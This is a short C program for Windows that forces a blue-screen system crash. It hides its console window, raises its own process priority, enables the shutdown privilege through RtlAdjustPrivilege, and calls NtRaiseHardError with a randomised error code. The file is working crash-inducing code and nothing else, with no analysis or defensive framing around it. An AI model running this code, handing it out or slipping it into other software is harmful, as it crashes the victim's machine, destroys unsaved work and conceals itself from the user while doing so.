#include <stdio.h>
#include <time.h>
#include <Windows.h>

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)
typedef LONG NTSTATUS;
typedef ULONG* ULONG_PTR;
typedef ULONG_PTR* PULONG_PTR;

#define STATUS_DLL_INIT_FAILED ((NTSTATUS)0xC0000142L)
#define STATUS_INVALID_ADDRESS ((NTSTATUS)0xC0000141L)

// Declaration of RtlAdjustPrivilege and NtRaiseHardError
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

// Declaration of GetConsoleWindow (NT5 or later)
typedef HWND (WINAPI* pdef_GetConsoleWindow)(void);

int main()
{
	// For error handling
	NTSTATUS error_ret = NULL;
	// Load ntdll.dll to current process
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege;
	pdef_NtRaiseHardError NtRaiseHardError;

	// Load kernel32.dll to current process
	HMODULE kernel32 = LoadLibraryW(L"kernel32.dll");
	pdef_GetConsoleWindow GetConsoleWindow;

	BOOLEAN bEnabled;
	NTSTATUS shutdown_priv;

	ULONG uResp;
	NTSTATUS bsod;

	// Hide console
	GetConsoleWindow = (pdef_GetConsoleWindow)GetProcAddress(kernel32, "GetConsoleWindow");
	if(GetConsoleWindow != NULL) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	// Set current process priority class to highest available
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	

	if (ntdll == NULL)
	{
		error_ret = STATUS_DLL_INIT_FAILED;
		goto jmp_exit;
	}

	// Import address of RtlAdjustPrivilege and NtRaiseHardError
	RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
	if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL)
	{
		error_ret = STATUS_INVALID_ADDRESS;
		goto jmp_exit;
	}

	// Activate shutdown privilege
	shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
	if (!NT_SUCCESS(shutdown_priv))
	{
		error_ret = shutdown_priv;
		goto jmp_exit;
	}

	// Push bsod
	srand((UINT32)time(NULL));
   
	bsod = NtRaiseHardError((NTSTATUS)(0xC0000000 | ((rand() % 10) << 8) | ((rand() % 16) << 4) | rand() % 16), NULL, NULL, NULL, 6, &uResp);
	if (!NT_SUCCESS(bsod))
	{
		error_ret = bsod;
		goto jmp_exit;
	}

	// Cleanup
	jmp_exit:
	if (error_ret != STATUS_DLL_INIT_FAILED || ntdll != NULL)
	{
		FreeLibrary(ntdll);
	}
	if (error_ret != NULL)
	{
		WCHAR msg[17] = L"";
		swprintf(msg, 16, L"0x%08lX", error_ret);
		MessageBoxW(NULL, msg, L"Returned", MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
	}
	return (int)error_ret;
}